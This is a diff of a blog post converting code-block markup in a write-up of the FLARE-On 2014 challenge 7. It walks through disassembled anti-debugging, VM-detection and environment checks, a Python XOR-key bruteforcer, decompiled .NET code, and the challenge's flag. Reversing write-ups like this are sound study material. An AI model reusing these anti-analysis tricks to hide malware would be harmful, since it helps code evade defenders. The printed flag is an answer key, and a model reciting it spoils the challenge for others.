-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![0xCC Check](/images/2014/flare/7-11.jpg "0xCC Check")
 
 Offsets from two functions are loaded and then compared. The first one calls ``isDebuggerPresent`` and the second one just prints something and exits. We have seen this function before, it is the first check.
 
-{{< codecaption lang="nasm" title="calls_isDebuggerPresent" >}}
+{% codeblock lang:nasm calls_isDebuggerPresent >}}
 01030 calls_isDebuggerPresent proc near
 .text:00401030 push    esi
 .text:00401031 call    ds:IsDebuggerPresent
@@ -1609,9 +1612,9 @@ Offsets from two functions are loaded and then compared. The first one calls ``i
 .text:0040103D xor     ecx, ecx
 .text:0040103F test    eax, eax
 .text:00401041 jz      short loc_401079
-{{< /codecaption >}}
+{% endcodeblock >}}
 
-{{< codecaption lang="nasm" title="sub_401780" >}}
+{% codeblock lang:nasm sub_401780 >}}
 .text:00401780 sub_401780 proc near
 .text:00401780
 .text:00401780 arg_0= dword ptr  8
@@ -1626,23 +1629,23 @@ Offsets from two functions are loaded and then compared. The first one calls ``i
 .text:00401794 push    0FFFFDCD7h      ; uExitCode
 .text:00401799 call    ds:ExitProcess
 .text:00401799 sub_401780 endp
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 None of these functions are called. But their offsets are compared. If offset of ``calls_isDebuggerPresent`` is larger than ``sub_401780`` then we jump down and string ``I can haz decode?`` is xor-ed with the blob. Otherwise we go right. **I am not quite sure what this check is for**. I think it is trying to find if calls to ``isDebuggerPresent`` are redirected or not (by the debugger?) as the address of the first function is ``0x401030`` and is smaller than ``0x401780``. If you know what this means please let me know and I will update this section. In all of my runs the jump does not happen and execution continues to the right.
 
 To the right we can see a pretty standard ``0xCC`` check. ``0xCC`` is the code for ``INT 3`` and is used by debuggers to set breakpoints. It is simply checking if ``0xCC`` bytes are present in the function code. If ``0xCC`` is present ``ecx`` is increased by 2, otherwise by one. In the end this number is compared with ``0x55``. If the check does not pass it will jump to left (same as above) and ``I can haz decode?`` is xor-ed with the blob. If the number is ``0x55`` string ``Such fire. Much burn. Wow.`` is xor-ed with the blob.
 
-{{< codecaption lang="python" title="ICanHaz?" >}}
+{% codeblock lang:python ICanHaz? >}}
 if (calls_isDebuggerPresent.address > sub_401780.address) or (calls_isDebuggerPresent.has0xCC == True ):
     blob = xor(blob,"I can haz decode?")
 else:
     blob = xor(blob,"Such fire. Much burn. Wow.")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 
 #### Function 7 - NtGlobalFlag
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    BeingDebugged
 .text:00401B1D call    VMware_detection
@@ -1655,7 +1658,7 @@ else:
 .text:00401B3D call    sub_4014F0
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 This one is pretty straightforward. A field inside the ``PEB`` (we have already seen it) is called ``NtGlobalFlag``. This flag is at offset ``0x68`` in 32-bit versions of Windows (and ``0xBC`` for 64-bit). Usually it is set to zero but it can be changed. A process that is started by a debugger will have this field set to ``0x70``. To read more about it, please look at the [Anti-Debugging](http://pferrie.host22.com/papers/antidebug.pdf) reference.
 
@@ -1663,17 +1666,17 @@ This one is pretty straightforward. A field inside the ``PEB`` (we have already 
 
 If ``NtGlobalFlag`` is not ``0x70`` then ``\x09\x00\x00\x01`` will be xor-ed with the blob, otherwise ``Feel the sting of the monarch!``.
 
-{{< codecaption lang="python" title="NtGlobalFlag" >}}
+{% codeblock lang:python NtGlobalFlag >}}
 if (NtGlobalFlag == 0x70):
     blob = xor(blob,"Feel the sting of the monarch!")
     
 else:
     blob = xor(blob,"\x09\x00\x00\x01")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 8 - Sands of Time
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    BeingDebugged
 .text:00401B1D call    VMware_detection
@@ -1686,13 +1689,13 @@ else:
 .text:00401B3D call    sub_4014F0
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![Checking day of the week](/images/2014/flare/7-13.jpg "Checking day of the week")
 
 This is not a countermeasure but a simple check. First ``time64`` is called and returns the number of seconds since January 1st 1970. Then ``localtime64`` converts it to [readabled format](http://msdn.microsoft.com/en-us/library/bf12f0hc.aspx) stored in a structure of type ``tm`` according to MSDN:
 
-{{< codecaption lang="cpp" title="tm" >}}
+{% codeblock lang:cpp tm >}}
 // each field is an int (4 bytes)
 
 tm_sec:     Seconds after minute (0 – 59)
@@ -1705,20 +1708,20 @@ tm_wday:    Day of week (0 – 6; Sunday = 0) : offset: 24
 tm_yday:    Day of year (0 – 365; January 1 = 0)
 tm_isdst:   Positive value if daylight saving time is in effect; 0 if daylight saving time is not in effect; negative value if status of daylight saving time is unknown
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Next instruction ``cmp dword ptr [eax+18h], 5`` compares 24th (0x16) byte of the structure with 5. Because each field is of type ``int`` and 4 bytes, 24th byte will be the current day of the week. Sunday is 0, so Friday is 5. The application simply checks if it is Friday. If so, it will xor ``! 50 1337`` with the blob and if it is not Friday blob will be xor-ed with ``1337``.
 
-{{< codecaption lang="python" title="Day of the week check" >}}
+{% codeblock lang:python Day of the week check >}}
 if (Friday):
     blob = xor(blob,"! 50 1337")
 else:
     blob = xor(blob,"1337")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 9 - Backdoge.exe
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    BeingDebugged
 .text:00401B1D call    VMware_detection
@@ -1731,7 +1734,7 @@ else:
 .text:00401B3D call    sub_4014F0   ; you are here
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Before next function, executable's complete path is saved into ``eax``. Then ``sub_4014F0`` is called.
 
@@ -1743,16 +1746,16 @@ Again, this is just a check. Executable's name is compared with ``backdoge.exe``
 
 The rest is pretty easy. If filename check passes, ``MATH IS HARD`` will be xor-ed with the blob and if not ``LETS GO SHOPPING``.
 
-{{< codecaption lang="python" title="Filename check" >}}
+{% codeblock lang:python Filename check >}}
 if (filename == "BackDoge.exe"):
     blob = xor(blob,"MATH IS HARD")
 else:
     blob = xor(blob,"LETS GO SHOPPING")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 10 - Dogecoin.com IP Check
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    BeingDebugged
 .text:00401B1D call    VMware_detection
@@ -1765,11 +1768,11 @@ else:
 .text:00401B3D call    BackDoge
 .text:00401B42 call    sub_401590   ; you are here
 .text:00401B47 call    sub_4016F0
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Another check. This time the application retrieves the IP for ``www.dogecoin.com`` using [gethostbyname](http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx). The result is of the form [hostent](http://msdn.microsoft.com/en-us/library/windows/desktop/ms738552%28v=vs.85%29.aspx):
 
-{{< codecaption lang="cpp" title="hostent structure (for Win32)" >}}
+{% codeblock lang:cpp hostent structure (for Win32) >}}
 typedef struct hostent {
   char FAR      *h_name;        // index: 0
   char FAR  FAR **h_aliases;    // index: 4 
@@ -1777,7 +1780,7 @@ typedef struct hostent {
   short         h_length;       // index: 9
   char FAR  FAR **h_addr_list;
 } HOSTENT, *PHOSTENT, FAR *LPHOSTENT;
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![Dogecoin.com IP](/images/2014/flare/7-16.jpg "Dogecoin.com IP")
 
@@ -1789,16 +1792,16 @@ Then 8th byte will be compared with ``2`` which is ``h_addrtype``. According to 
 
 The xor-string is ``LETS GO MATH`` if the resolved IP address is not ``127.0.0.1``. If the IP address is ``127.0.0.1`` or ``h_addrtype`` is not ``2`` then ``SHOPPING IS HARD`` will be xor-ed with the blob.
 
-{{< codecaption lang="python" title="Dogecoin.com IP check" >}}
+{% codeblock lang:python Dogecoin.com IP check >}}
 if (h_addrtype != 2 or (Dogecoin_ip == "127.0.0.1")):
     blob = xor(blob,"SHOPPING IS HARD")
 if (Dogecoin_ip != "127.0.0.1"):
     blob = xor(blob,"LETS GO MATH")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 11 - Hour of the Wolf
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    BeingDebugged
 .text:00401B1D call    VMware_detection
@@ -1811,13 +1814,13 @@ if (Dogecoin_ip != "127.0.0.1"):
 .text:00401B3D call    BackDoge
 .text:00401B42 call    IPCheck
 .text:00401B47 call    sub_4016F0   ; you are here
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![Hour check](/images/2014/flare/7-18.jpg "Hour check")
 
 Again, we see the familiar ``time64`` and ``localtime64`` calls. This time offset 8 of the ``tm`` structure (copied below) is compared with ``0x11`` or ``17``. This offset contains the number of hours after midnight, so the application is checking if it is between 5 and 6 PM.
 
-{{< codecaption lang="cpp" title="tm" >}}
+{% codeblock lang:cpp tm >}}
 // each field is an int (4 bytes)
 
 tm_sec:     Seconds after minute (0 – 59).  ; index: 0
@@ -1830,20 +1833,20 @@ tm_wday:    Day of week (0 – 6; Sunday = 0).
 tm_yday:    Day of year (0 – 365; January 1 = 0).
 tm_isdst:   Positive value if daylight saving time is in effect; 0 if daylight saving time is not in effect; negative value if status of daylight saving time is unknown.
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 If time check passes, blob is xor-ed with ``\x01\x02\x03\x05\x00\x78\x30\x38\x0d`` otherwise it will be xor-ed with ``\x07\x77``.
 
-{{< codecaption lang="python" title="Hour check" >}}
+{% codeblock lang:python Hour check >}}
 if (Hour == 17)):   # Between 5 and 6 PM
     blob = xor(blob,"\x01\x02\x03\x05\x00\x78\x30\x38\x0d")
 else:
     blob = xor(blob,"\x07\x77")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Interlude - 12 - Fullpath xor
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B3D call    BackDoge
 .text:00401B42 call    IPCheck
 .text:00401B47 call    HourCheck
@@ -1872,25 +1875,25 @@ else:
 .text:00401B83 loc_401B83:                             ; CODE XREF: .text:00401B58j
 .text:00401B83 call    sub_4017A0
 .text:00401B88 call    sub_4018A0
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 We finished the first 10 functions, YAY. Now we see that the full path of binary is xor-ed with the blob. However, **keep in mind that one of the checks compared full path with ``backdoge.exe``**.
 
-{{< codecaption lang="python" title="Fullpath xor" >}}
+{% codeblock lang:python Fullpath xor >}}
 blob = xor(blob, fullpath)
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 
 #### Function 13 - Internet Rootz
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B83 loc_401B83:                             ; CODE XREF: .text:00401B58j
 .text:00401B83 call    sub_4017A0       ; you are here
 .text:00401B88 call    sub_4018A0
 .text:00401B8D mov     ecx, [esi+4]
 .text:00401B90 movzx   edx, byte ptr [ecx]
 .text:00401B93 mov     blob, dl
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Two more functions. We're getting there.
 
@@ -1902,22 +1905,22 @@ We have seen this type of code. This function pushes ``e.root-servers.net`` to s
 
 The rest is pretty simple. ``192.203.230.10`` is xor-ed with the blob.
 
-{{< codecaption lang="python" title="Fullpath xor" >}}
+{% codeblock lang:python Fullpath xor >}}
 blob = xor(blob,"192.203.230.10")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 14 - jackRAT
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B83 loc_401B83:                             ; CODE XREF: .text:00401B58j
 .text:00401B83 call    InternetRootz
 .text:00401B88 call    sub_4018A0       ; you are here
 .text:00401B8D mov     ecx, [esi+4]
 .text:00401B90 movzx   edx, byte ptr [ecx]
 .text:00401B93 mov     blob, dl
-{{< /codecaption >}}
+{% endcodeblock >}}
 
-{{< codecaption lang="nasm" title="sub_4018A0" >}}
+{% codeblock lang:nasm sub_4018A0 >}}
 
 .text:004018A0 sub_4018A0 proc near
 .text:004018A0
@@ -1948,11 +1951,11 @@ blob = xor(blob,"192.203.230.10")
 .text:004018E1 mov     esp, ebp
 .text:004018E3 pop     ebp             ; exit if NULL handle was retured
 .text:004018E4 ret
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 We see [InternetOpen](http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx) called. This function initialises the WinINet functions. Agent name is ``ZBot`` which is an alternate name for the ``Zeus`` trojan horse. Access type is ``INTERNET_OPEN_TYPE_DIRECT`` which means direct access without the use of any proxies. If a NULL handle is returned then function will exit (line 28). If not it will jump to ``loc_4018E5`` (line 21).
 
-{{< codecaption lang="nasm" title="loc 4018E5 - InternetOpenUrl" >}}
+{% codeblock lang:nasm loc 4018E5 - InternetOpenUrl >}}
 .text:004018E5 loc_4018E5:             ; dwContext
 .text:004018E5 push    ebx
 .text:004018E6 push    400100h         ; dwFlags
@@ -1992,11 +1995,11 @@ We see [InternetOpen](http://msdn.microsoft.com/en-us/library/windows/desktop/aa
 .text:004019B5 mov     [ebp+hInternet], eax
 .text:004019BB cmp     eax, ebx        ; ebx == 0x00 - check if eax is zero
 .text:004019BD jz      loc_4018D4      ; if (eax == 0 ) jump to loc_4018D4 (return immedi
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 [InternetOpenUrl](http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx) opens a handle to a resource. ``dwFlags`` is set to ``0x00400100``. I could not find the exact meaning of this flag value. However, according to [this page](http://msdn.microsoft.com/en-us/library/windows/desktop/aa383661%28v=vs.85%29.aspx) it could be the ``OR`` of two flags (does it work that way?):
 
-{{< codecaption lang="powershell" title="0x00400100 flag" >}}
+{% codeblock 0x00400100 flag >}}
 
 INTERNET_FLAG_KEEP_CONNECTION: 0x00400000
 Uses keep-alive semantics, if available, for the connection.
@@ -2004,17 +2007,15 @@ Uses keep-alive semantics, if available, for the connection.
 INTERNET_FLAG_PRAGMA_NOCACHE: 0x00000100
 Forces the request to be resolved by the origin server.
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Lines 9 to 35 are saving the URL, we know what it is without even looking at it. We have seen it in Wireshark before. The URL is ``https://twitter.com/FireEye/status/484033515538116608``.
 
-<!-- ![Fireeye tweet](/images/2014/flare/7-2.jpg "Fireeye tweet") -->
-
-{{< tweet 484033515538116608 >}}
+![Fireeye tweet](/images/2014/flare/7-2.jpg "Fireeye tweet")
 
 Line 37 saves return value which is a "valid handle to the URL if the connection is successfully established, or NULL if the connection fails". Then it is checked for being NULL, if so we will jump to ``loc_4018D4`` and function returns immediately. If we have a handle to the tweet, execution continues.
 
-{{< codecaption lang="nasm" title="loc 4019D6 - InternetReadFile" >}}
+{% codeblock lang:nasm loc 4019D6 - InternetReadFile >}}
 .text:004019D6 loc_4019D6:
 .text:004019D6 lea     edx, [ebp+dwNumberOfBytesRead]
 .text:004019DC push    edx             ; lpdwNumberOfBytesRead - Pointer to variable that will hold number of bytes read
@@ -2050,7 +2051,7 @@ Line 37 saves return value which is a "valid handle to the URL if the connection
 
 .text:004019D0 loc_4019D0:
 .text:004019D0 mov     eax, [ebp+hInternet] ; Back to the top to continue reading
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 [InternetReadFile](http://msdn.microsoft.com/en-us/library/windows/desktop/aa385103%28v=vs.85%29.aspx) retrieves the tweet. A buffer is created to hold the retrieved data. Documentation says "[a] normal read retrieves the specified dwNumberOfBytesToRead for each call to InternetReadFile until the end of the file is reached. To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns TRUE and the lpdwNumberOfBytesRead parameter equals zero." This is happening in lines 31-35. We keep reading until ``NumberofBytesRead`` is zero.
 
@@ -2062,13 +2063,13 @@ We retrieved the tweet. Now [strstr](http://msdn.microsoft.com/en-us/library/win
 
 ![xor(blob,"jackRAT")](/images/2014/flare/7-22.jpg "xor(blob,"jackRAT")
 
-{{< codecaption lang="python" title="jackRAT xor" >}}
+{% codeblock lang:python jackRAT xor >}}
 blob = xor(blob,"jackRAT")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ### Are we there yet? gratz but not yet
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B83 loc_401B83:                             ; CODE XREF: .text:00401B58j
 .text:00401B83 call    InternetRootz
 .text:00401B88 call    jackRAT
@@ -2108,7 +2109,7 @@ blob = xor(blob,"jackRAT")
 .text:00401BFE call    _system               ; system("gratz.exe"); Execute gratz.exe
 .text:00401C03 mov     ecx, [ebp-4]
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 The application crashed in line 5 over and over again. When I looked inside ecx I saw empty space but looking around I saw the application's complete path. After a while I realized that the code is trying to read arguments. The rest is obvious from the code. First two characters of first argument are written over the first two characters of the blob. First and second characters of second argument are written at offset ``0x80`` and ``0x81``.
 
@@ -2122,7 +2123,7 @@ But how do we get the correct binary. As we have already seen, there are a serie
 
 Here's my bruteforcer. This is not good code but at that point I just wanted to finish.
 
-{{< codecaption lang="python" title="bruteforcer" >}}
+{% codeblock lang:python bruteforcer >}}
 
 key1={}
 key1[0]='oh happy dayz'
@@ -2271,7 +2272,7 @@ for index[1] in xrange(2):
                             out = wholefile[:0x10]
                             counter +=1
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 It's a bad bruteforcer but it does the job. To speed things up, it only performs the xor-es with the first ``0x80`` bytes of the binary which is the ``DOS Stub``. In the end, it compares the first two bytes with ``MZ`` and then xor-es the whole binary before writing it to a file.
 
@@ -2281,7 +2282,7 @@ I got two files and after opening them in hex editors, one was clearly a false p
 
 But we cannot see the email. Augh. This is a .NET application. We need to decompile it like the first challenge.
 
-{{< codecaption lang="c#" title="Decompiled gratz.exe" >}}
+{% codeblock lang:c# Decompiled gratz.exe >}}
 public Form1()
 {
   this.InitializeComponent();
@@ -2299,11 +2300,11 @@ public void lulzors()
   this.label2.Text = lulz.decoder4("\v\fP\x000E\x000FBA\x0006\rG\x0015I\x001A\x0001\x0016H\\\t\b\x0002\x0013/\b\t^\x001D\bJO\a]C\x001B\x0005");
 }
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 And inside ``lulz.cs``.
 
-{{< codecaption lang="c#" title="lulz.cs" >}}
+{% codeblock lang:c# lulz.cs >}}
 // decoder1 and decoder3 omitted
 
 public string decoder2(string encoded)
@@ -2324,11 +2325,13 @@ public string decoder4(string encoded)
   return str1;
 }
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 We can either write code or paste it into an online C# compiler. In the end we have the flag:
 
-#### Level 7 flag: da7.f1are.finish.lin3@flare-on.com
+{% codeblock Flag 7 >}}
+da7.f1are.finish.lin3@flare-on.com
+{% endcodeblock >}}
 
 And the email:
 
